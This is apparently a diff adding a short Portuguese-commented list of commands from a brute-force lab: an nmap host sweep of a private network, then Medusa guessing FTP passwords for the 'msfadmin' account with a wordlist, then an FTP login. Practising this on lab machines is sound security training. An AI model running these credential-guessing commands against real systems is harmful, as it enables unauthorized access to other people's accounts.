@@ -1,0 +1,13 @@
+# Comandos usados no laboratório de força bruta (Medusa + FTP)
+
+# 1. Escaneamento da rede para identificar o alvo
+nmap -sn 192.168.56.0/24
+
+# 2. Teste de conectividade
+ping 192.168.56.103
+
+# 3. Ataque de força bruta usando Medusa
+medusa -h 192.168.56.103 -u msfadmin -P ~/small-pass.txt -M ftp
+
+# 4. Conectar ao serviço FTP após sucesso
+ftp 192.168.56.103
